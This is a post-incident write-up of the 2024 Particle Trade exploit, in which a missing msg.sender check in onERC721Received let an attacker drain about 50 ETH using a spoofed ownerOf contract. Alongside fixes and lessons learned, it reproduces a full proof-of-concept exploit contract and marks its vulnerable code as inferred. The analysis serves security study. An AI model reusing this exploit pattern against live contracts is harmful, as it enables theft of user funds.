# Particle Trade — Unverified User Input (onERC721Received Spoofing) Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-02-15 |
| **Protocol** | Particle Trade (Particle Exchange) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~50 ETH (~$139,000) |
| **Attacker** | [0x2c90...5559](https://etherscan.io/address/0x2c903f97ea69b393ea03e7fab8d64d722b3f5559) |
| **Attack Contract** | [0xe556...ef8f](https://etherscan.io/address/0xe55607b2967ddbe5fa9a6a921991545b8277ef8f) |
| **Attack Tx** | [0xd9b3...5ff6](https://etherscan.io/tx/0xd9b3e229acc755881890394cc76fde0d7b83b1abd4d046b0f69c1fd9fd495ff6) |
| **Vulnerable Contract** | [0xe476...36e4](https://etherscan.io/address/0xe4764f9cd8ecc9659d3abf35259638b20ac536e4) |
| **Proxy (ParticleExchange)** | [0x7c5C...080D](https://etherscan.io/address/0x7c5C9AfEcf4013c43217Fb6A626A4687381f080D) |
| **Attack Block** | [19,231,445](https://etherscan.io/block/19231445) |
| **Root Cause** | No validation of NFT ownership or collection address in the `onERC721Received` callback |
| **PoC Source** | [DeFiHackLabs — ParticleTrade_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/ParticleTrade_exp.sol) |
| **Analysis Reference** | [@Phalcon_xyz Twitter](https://twitter.com/Phalcon_xyz/status/1758028270770250134) |

---

## 1. Vulnerability Overview

Particle Trade is a leveraged trading protocol that uses NFTs as collateral. Users deposit NFTs into the protocol and borrow ETH to open leveraged positions. The protocol's core flow relies on the `onERC721Received` callback function, which is automatically triggered upon NFT receipt via `safeTransferFrom`.

This attack chained two fundamental input validation flaws, allowing the attacker to drain balances from the protocol by calling `onERC721Received` directly — without actually owning or transferring any NFT.

**Key Vulnerability Combination:**

1. **V-01 (CRITICAL)**: The `onERC721Received` function does not verify that it was called within an actual ERC-721 transfer context — anyone can call it directly
2. **V-02 (CRITICAL)**: The return value of `ownerOf()` from the `collection` address (contract) is trusted — an attacker can specify a spoofed contract as `collection` to manipulate the `ownerOf()` return value
3. **V-03 (HIGH)**: No validation when associating a lien created via `offerBid()` without collateral with the `onERC721Received` callback

---

## 2. Vulnerable Code Analysis

### 2.1 onERC721Received — Direct Call Allowed (Core Vulnerability)

```solidity
// ❌ Vulnerable code (inferred — Particle Exchange implementation)
function onERC721Received(
    address operator,
    address from,
    uint256 tokenId,
    bytes calldata data
) external returns (bytes4) {
    // ❌ Does not verify that msg.sender is the actual NFT contract
    // ❌ Anyone can call this function directly and pass arbitrary data
    
    // Decode lien information from data
    (
        Lien memory lien,
        uint256 lienId,
        uint256 amount,
        address marketplace,
        address taker,
        bytes memory tradeData
    ) = abi.decode(data, (Lien, uint256, uint256, address, address, bytes));
    
    // ❌ Does not verify that lien.collection matches msg.sender (the actual NFT contract)
    // ❌ Does not verify that from actually owns the NFT
    
    // Calls ownerOf() on the attacker-supplied lien.collection address
    address owner = IERC721(lien.collection).ownerOf(tokenId);
    // ❌ owner points to the attacker's contract — attacker can return any value from ownerOf()
    
    // Opens a position and increases account balance
    _openPosition(lien, lienId, tokenId, owner, ...);
}
```

```solidity
// ✅ Fixed code — NFT transfer context validation added
function onERC721Received(
    address operator,
    address from,
    uint256 tokenId,
    bytes calldata data
) external returns (bytes4) {
    // ✅ msg.sender must match the collection address registered in the lien
    (Lien memory lien, uint256 lienId, ...) = abi.decode(
        data, (Lien, uint256, uint256, address, address, bytes)
    );
    
    // ✅ Verify actual NFT transfer context
    require(
        msg.sender == lien.collection,
        "ParticleExchange: caller is not the NFT collection"
    );
    
    // ✅ On-chain verification that tokenId owner is actually from
    require(
        IERC721(lien.collection).ownerOf(tokenId) == from,
        "ParticleExchange: invalid NFT owner"
    );
    
    // ✅ Verify that from is an authorized transferor
    require(
        from == operator || IERC721(lien.collection).isApprovedForAll(from, operator),
        "ParticleExchange: unauthorized operator"
    );
    
    _openPosition(lien, lienId, tokenId, from, ...);
}
```

**Issue**: In the ERC-721 standard, `onERC721Received` is a callback invoked by the NFT contract on the recipient during a `safeTransferFrom` call. However, at the Solidity level, this function is an ordinary `external` function that anyone can call directly. By omitting the `msg.sender == lien.collection` check, the protocol allowed the attacker to trigger the callback without an actual NFT transfer.

### 2.2 ownerOf Spoofing — Registering a Malicious Contract as collection

```solidity
// ❌ Attacker contract — spoofs ownerOf
contract AttackContract {
    address ownerofaddr;
    
    constructor() {
        ownerofaddr = address(particleExchangeProxy); // initial value: protocol address
    }
    
    // ❌ ownerOf() initially returns the protocol address, then zero address
    function ownerOf(uint256 tokenId) external returns (address owner) {
        return ownerofaddr; // returns attacker-manipulated value
    }
    
    // ❌ State change on safeTransferFrom call (no actual NFT transfer)
    function safeTransferFrom(
        address from, address to, uint256 tokenId, bytes calldata _data
    ) external {
        ownerofaddr = address(0); // reset owner after transfer
    }
}
```

```solidity
// ✅ Fixed validation — verify that collection is an actual ERC-721 contract
function _validateCollection(address collection) internal view {
    // ✅ Verify that collection supports the ERC-721 interface
    require(
        IERC165(collection).supportsInterface(type(IERC721).interfaceId),
        "ParticleExchange: collection is not ERC-721"
    );
    
    // ✅ Only allow whitelisted collections (optional hardening)
    require(
        approvedCollections[collection],
        "ParticleExchange: collection not approved"
    );
}
```

**Issue**: When the protocol calls `ownerOf()` via `lien.collection`, it does not verify at all that the contract is an actual NFT contract. An attacker can register a spoofed contract that returns an arbitrary address from `ownerOf()` as the `collection`, bypassing the ownership check entirely.

### 2.3 tokenId Range Not Validated — Abnormal IDs Accepted

```solidity
// ❌ Vulnerable code — no tokenId validity check
function onERC721Received(..., uint256 tokenId, ...) external returns (bytes4) {
    // ❌ Abnormal values such as tokenId = 50_126_827_091_960_426_151 are also accepted
    // ❌ Does not verify whether the tokenId actually exists
    ...
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- The attacker pre-resets their ETH balance to 0 (`payable(zero).transfer(address(this).balance)`)
- The attacker contract implements spoofed `ownerOf()` and `safeTransferFrom()` functions
- The attacker identifies the Reservoir marketplace address to use in the attack

### 3.2 Execution Phase

```
Step 1: Call offerBid() — create a bid with no collateral
Step 2: Call onERC721Received() directly (1st) — abnormal tokenId
Step 3: Call onERC721Received() directly (2nd) — block number tokenId
Step 4: withdrawAccountBalance() — drain protocol balance
```

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────┐
│                     Attacker (EOA)                       │
│         0x2c903f97ea69b393ea03e7fab8d64d722b3f5559      │
└─────────────────────┬───────────────────────────────────┘
                      │ deploy
                      ▼
┌─────────────────────────────────────────────────────────┐
│                  Attack Contract                          │
│         0xe55607b2967ddbe5fa9a6a921991545b8277ef8f      │
│   ownerOf() spoofed / safeTransferFrom() spoofed        │
│   ownerofaddr = proxy address (initial value)            │
└──────────┬──────────────────────────────────────────────┘
           │
           │ 1. offerBid(collection=attack contract, 0, 0, 0)
           ▼
┌─────────────────────────────────────────────────────────┐
│              ParticleExchange Proxy                      │
│         0x7c5C9AfEcf4013c43217Fb6A626A4687381f080D      │
│   → lienId created (no collateral)                      │
└──────────┬──────────────────────────────────────────────┘
           │ returns lienId
           ▼
┌─────────────────────────────────────────────────────────┐
│                  Attack Contract                          │
│   2. onERC721Received(zero, zero, tokenId=50126..., data) direct call
│      ┌─ data = abi.encode(lien, lienId, 0, Reservoir, zero, "0x")
│      └─ lien.collection = attack contract itself
└──────────┬──────────────────────────────────────────────┘
           │ ❌ No msg.sender check → processing proceeds
           ▼
┌─────────────────────────────────────────────────────────┐
│              ParticleExchange Proxy                      │
│   → calls lien.collection.ownerOf(tokenId)              │
│                                                         │
└──────────┬──────────────────────────────────────────────┘
           │ ownerOf() query
           ▼
┌─────────────────────────────────────────────────────────┐
│                  Attack Contract                          │
│   ownerOf() return value = proxy address (ownerofaddr)  │
│   → Spoofs "proxy owns the NFT"                         │
└──────────┬──────────────────────────────────────────────┘
           │ returns spoofed owner
           ▼
┌─────────────────────────────────────────────────────────┐
│              ParticleExchange Proxy                      │
│   → Opens position: proxy is owner, so internal balance increases │
│   → safeTransferFrom(proxy, attack contract, tokenId, ...) │
└──────────┬──────────────────────────────────────────────┘
           │ safeTransferFrom call
           ▼
┌─────────────────────────────────────────────────────────┐
│                  Attack Contract                          │
│   safeTransferFrom() executes:                          │
│   ownerofaddr = address(0)  ← state change!             │
└──────────┬──────────────────────────────────────────────┘
           │
           │ 3. onERC721Received(zero, zero, tokenId2=19231446, data2) direct call
           ▼
┌─────────────────────────────────────────────────────────┐
│              ParticleExchange Proxy                      │
│   → calls lien2.collection.ownerOf(tokenId2)             │
│   → ownerOf() returns address(0) (after safeTransferFrom) │
│   → additional position processed / balance increased further │
└──────────┬──────────────────────────────────────────────┘
           │ account balance increase complete
           ▼
┌─────────────────────────────────────────────────────────┐
│                  Attack Contract                          │
│   4. accountBalance(address(this)) — query balance       │
│   5. withdrawAccountBalance() — drain ~50 ETH!          │
└─────────────────────────────────────────────────────────┘
           │
           ▼
┌─────────────────────────────────────────────────────────┐
│                     Attacker (EOA)                       │
│   Attacker ETH balance: 0 ETH → ~50 ETH (profit)        │
│   Protocol loss: ~50 ETH (~$139,000)                    │
└─────────────────────────────────────────────────────────┘
```

### 3.4 Outcome

- **Attacker Profit**: ~50 ETH (~$139,000)
- **Protocol Loss**: ~50 ETH (~$139,000)
- **Number of Attacks**: Completed in a single transaction

---

## 4. PoC Code (Excerpted from DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

// @KeyInfo - Total Lost : ~50 $ETH
// Attacker : https://etherscan.io/address/0x2c903f97ea69b393ea03e7fab8d64d722b3f5559
// Attack Contract : https://etherscan.io/address/0xe55607b2967ddbe5fa9a6a921991545b8277ef8f
// Vulnerable Contract : https://etherscan.io/address/0xe4764f9cd8ecc9659d3abf35259638b20ac536e4
// Attack Tx : https://etherscan.io/tx/0xd9b3e229acc755881890394cc76fde0d7b83b1abd4d046b0f69c1fd9fd495ff6

contract ContractTest is Test {
    // Set up proxy (ParticleExchange interface) and vulnerable contract address
    IParticleExchange proxy = IParticleExchange(0x7c5C9AfEcf4013c43217Fb6A626A4687381f080D);
    address ParticleExchange = 0xE4764f9cd8ECc9659d3abf35259638B20ac536E4;
    
    // State variable for ownerOf() spoofing
    // Initial value: proxy address → after safeTransferFrom: address(0)
    address ownerofaddr = address(proxy);

    function testExploit() public {
        // [Setup] Reset attacker ETH balance to 0 (for profit measurement)
        payable(zero).transfer(address(this).balance);

        // [Step 1] Create a bid offer with no collateral → obtain lienId
        // price=0, rate=0 → effectively zero cost
        (uint256 lienId) = proxy.offerBid(
            address(this), // collection = attack contract itself (for ownerOf spoofing)
            uint256(0),    // margin = 0
            uint256(0),    // price = 0
            uint256(0)     // rate = 0
        );

        // [Step 2] First direct call to onERC721Received
        // tokenId = 50_126_827_091_960_426_151 (abnormally large value — non-existent NFT ID)
        uint256 tokenId = 50_126_827_091_960_426_151;
        IParticleExchange.Lien memory lien = IParticleExchange.Lien({
            lender: zero,
            borrower: address(this),
            collection: address(this), // ← disguise attack contract as NFT collection
            tokenId: 0,
            price: 0,
            rate: 0,
            loanStartTime: 0,
            auctionStartTime: 0
        });

        bytes memory bytecode = abi.encode(lien, lienId, 0, Reservoir, zero, "0x");
        // ❌ Direct call — no actual NFT transfer
        // ❌ No msg.sender check, so the protocol proceeds with processing
        proxy.onERC721Received(zero, zero, tokenId, bytecode);
        // During this call, the protocol calls collection.ownerOf(tokenId)
        // → ownerofaddr = proxy address returned → spoofs "proxy owns the NFT"
        // → protocol executes safeTransferFrom → ownerofaddr changed to address(0)

        // [Step 3] Second direct call to onERC721Received
        // tokenId2 = 19_231_446 (attack block number + 1)
        uint256 tokenId2 = 19_231_446;
        IParticleExchange.Lien memory lien2 = IParticleExchange.Lien({
            lender: zero,
            borrower: address(this),
            collection: address(this), // ← same spoofed collection
            tokenId: tokenId,          // ← reference to previous tokenId
            price: 0,
            rate: 0,
            loanStartTime: block.timestamp, // ← current block timestamp
            auctionStartTime: 0
        });

        bytes memory bytecode2 = abi.encode(lien2, lienId, 0, Reservoir, zero, "0x");
        ownerofaddr = address(proxy); // reset ownerofaddr before second call
        // ❌ Second direct call
        proxy.onERC721Received(zero, zero, tokenId2, bytecode2);

        // [Step 4] Query accumulated account balance
        proxy.accountBalance(address(this));

        // [Step 5] Drain ~50 ETH from the protocol
        proxy.withdrawAccountBalance();
    }

    // ❌ ownerOf() spoofed — bypasses protocol ownership check
    function ownerOf(uint256 tokenId) external returns (address owner) {
        return ownerofaddr; // returns proxy address or address(0)
    }

    // ❌ safeTransferFrom() spoofed — changes state without actual transfer
    function safeTransferFrom(
        address from, address to, uint256 tokenId, bytes calldata _data
    ) external {
        ownerofaddr = address(0); // next ownerOf() call will return address(0)
    }

    receive() external payable {} // receive ETH
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | onERC721Received direct call allowed (msg.sender not validated) | CRITICAL | CWE-20 (Improper Input Validation) | `03_access_control.md`, `11_logic_error.md` |
| V-02 | Trusting return value of external contract ownerOf() (untrusted external call) | CRITICAL | CWE-346 (Origin Validation Error) | `03_access_control.md` |
| V-03 | No collection address whitelist | HIGH | CWE-862 (Missing Authorization) | `03_access_control.md` |
| V-04 | No tokenId validity range check | MEDIUM | CWE-20 (Improper Input Validation) | `11_logic_error.md` |

### V-01: onERC721Received Direct Call Allowed

- **Description**: Per the ERC-721 standard, `onERC721Received` is a callback function automatically invoked by the NFT contract on the recipient during an NFT transfer (`safeTransferFrom`). However, in Solidity, this function is an ordinary `external` function that anyone can call directly. Particle Exchange did not verify that `msg.sender` is the actual NFT contract, allowing the attacker to trigger the callback without actually owning or transferring an NFT.
- **Impact**: The attacker passed arbitrarily manipulated `lien`, `tokenId`, and `data`, corrupting the protocol's internal state and draining the ETH balance.
- **Attack Condition**: The attack succeeds simply by having the attacker's contract implement `ownerOf()` and `safeTransferFrom()`.

### V-02: Untrusted External ownerOf() Call

- **Description**: The protocol verifies NFT ownership by calling `lien.collection.ownerOf(tokenId)`, but `lien.collection` is an address arbitrarily specified by the attacker. If the attacker registers a contract that manipulates `ownerOf()` as the `collection`, the ownership check is completely neutralized.
- **Impact**: The protocol accepts ownership of a non-existent NFT and opens a position.
- **Attack Condition**: The attacker deploys a contract that spoofs `ownerOf()` and registers that address as `collection`.

### V-03: No collection Address Whitelist

- **Description**: The protocol allows any arbitrary address as `collection`. Without a whitelist permitting only verified NFT contracts, an attacker can register a self-deployed spoofed contract as the collection.
- **Impact**: Provides the fundamental root cause for vulnerabilities V-01 and V-02.
- **Attack Condition**: Absence of a whitelist mechanism.

### V-04: No tokenId Range Validation

- **Description**: Abnormal IDs that cannot exist in any real NFT collection, such as `tokenId = 50_126_827_091_960_426_151`, are processed without validation.
- **Impact**: The attacker uses non-existent NFT IDs to confuse the protocol's logic.
- **Attack Condition**: Absence of tokenId validity checks.

---

## 6. Remediation Recommendations

### Immediate Actions

#### 6.1 onERC721Received — Enforce msg.sender Validation

```solidity
// ✅ Fix: msg.sender must be the NFT collection contract
function onERC721Received(
    address operator,
    address from,
    uint256 tokenId,
    bytes calldata data
) external returns (bytes4) {
    // ✅ Extract lien information from data first
    (Lien memory lien, uint256 lienId, uint256 amount,
     address marketplace, address taker, bytes memory tradeData)
        = abi.decode(data, (Lien, uint256, uint256, address, address, bytes));

    // ✅ Critical fix: msg.sender must equal lien.collection
    // i.e., the actual NFT contract must invoke this function via safeTransferFrom
    require(
        msg.sender == lien.collection,
        "ParticleExchange: caller must be the NFT collection"
    );

    // ✅ Additional: tokenId owner must match from
    require(
        IERC721(lien.collection).ownerOf(tokenId) == from,
        "ParticleExchange: tokenId owner mismatch"
    );

    _openPosition(lien, lienId, tokenId, from, amount, marketplace, taker, tradeData);
    return this.onERC721Received.selector;
}
```

#### 6.2 Implement collection Whitelist

```solidity
// ✅ Fix: whitelist allowing only approved NFT collections
mapping(address => bool) public approvedCollections;

// ✅ Only admin can register/deregister collections
function setApprovedCollection(address collection, bool approved)
    external onlyOwner
{
    // ✅ Verify it is an actual ERC-721 contract
    require(
        IERC165(collection).supportsInterface(type(IERC721).interfaceId),
        "ParticleExchange: not an ERC-721 contract"
    );
    approvedCollections[collection] = approved;
    emit CollectionApprovalUpdated(collection, approved);
}

function offerBid(
    address collection,
    uint256 margin,
    uint256 price,
    uint256 rate
) external returns (uint256 lienId) {
    // ✅ Only whitelisted collections can place bids
    require(
        approvedCollections[collection],
        "ParticleExchange: collection not approved"
    );
    // ... existing logic
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 (onERC721Received direct call) | Add mandatory `msg.sender == lien.collection` validation |
| V-02 (ownerOf trust) | Automatically resolved by `msg.sender` validation (combined with whitelist) |
| V-03 (no whitelist) | Introduce governance-based collection approval mechanism |
| V-04 (tokenId range) | Per-collection range validation based on `totalSupply()`, or handle actual `ownerOf()` reverts |
| General | Introduce protocol pause functionality and emergency withdrawal restrictions |
| General | Conduct independent security audits and operate a bug bounty program |

---

## 7. Lessons Learned

1. **ERC-721 callback functions are not a security boundary**: `onERC721Received` is an ordinary `external` function in Solidity. Any state-changing logic inside this function must verify that `msg.sender` is the actual NFT contract. The assumption that "it will be called by the ERC-721 standard" is not a code-level guarantee.

2. **Never trust return values from external contracts controlled by the attacker**: Using functions from external addresses specified by the attacker (e.g., `ownerOf()`, `balanceOf()`) for ownership or balance verification is fatal. Data that the protocol trusts must only come from controlled (whitelisted) contracts.

3. **Whitelisting is a mandatory defense layer in DeFi NFT protocols**: Protocols that use NFTs as collateral must maintain an approved list of collections. Allowing arbitrary addresses as collections enables attackers to completely bypass protocol logic through spoofed contracts.

4. **Design interfaces that distinguish callbacks from direct calls**: Separating internal business logic into its own function (`_processNFTDeposit`) and having the callback (`onERC721Received`) only perform validation before delegating to the internal function prevents this class of vulnerability.

5. **Large vulnerabilities can hide in simplicity**: This attack required no flash loans and no complex mathematical calculations. A single missing `msg.sender` check resulted in a ~$139,000 loss. This is a prime example of how much damage a simple input validation omission can cause.

6. **Recognize the unique attack surface of leveraged NFT protocols**: Leveraged protocols using NFTs as collateral have a more complex attack surface than typical DeFi — including NFT transfer callbacks, marketplace interfaces, and auction mechanisms. In particular, integrations with external marketplaces (such as Reservoir) require intensive security review.

---

## 8. On-Chain Verification

> Attack TX: [0xd9b3...5ff6](https://etherscan.io/tx/0xd9b3e229acc755881890394cc76fde0d7b83b1abd4d046b0f69c1fd9fd495ff6)

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Value | On-Chain Actual | Notes |
|------|--------|-------------|------|
| Attacker initial ETH balance | 0 ETH | 0 ETH | Matches |
| Attacker final ETH profit | ~50 ETH | ~50 ETH | Matches (per PoC comment) |
| Protocol loss | ~50 ETH | ~$139,000 | Reflects ETH price |
| Flash loan used | None | None | Single TX completion |

### 8.2 On-Chain Event Log Sequence (Inferred)

```
1. offerBid()                          → LienOpened event
2. onERC721Received() 1st call         → internal state change
3. safeTransferFrom() within onERC721Received() → attack contract ownerofaddr changed
4. onERC721Received() 2nd call         → account balance increased
5. withdrawAccountBalance()            → ETH Transfer event (~50 ETH)
```

### 8.3 Precondition Verification

| Item | Status |
|------|------|
| Flash loan required | Not required — collateral-free offerBid() is sufficient |
| Prior approval required | Not required |
| Minimum ETH requirement | Gas fees only |
| Attack complexity | Simple (single function call chain) |

> **Note**: Actual `cast` queries for attack TX `0xd9b3...5ff6` are recommended to be performed separately depending on RPC access environment.
> Phalcon analysis dashboard: https://explorer.phalcon.xyz/tx/eth/0xd9b3e229acc755881890394cc76fde0d7b83b1abd4d046b0f69c1fd9fd495ff6

---

*Written: 2024-02-15 | Analysis Tools: DeFiHackLabs PoC, Phalcon Explorer | Classification: Unverified User Input / Access Control*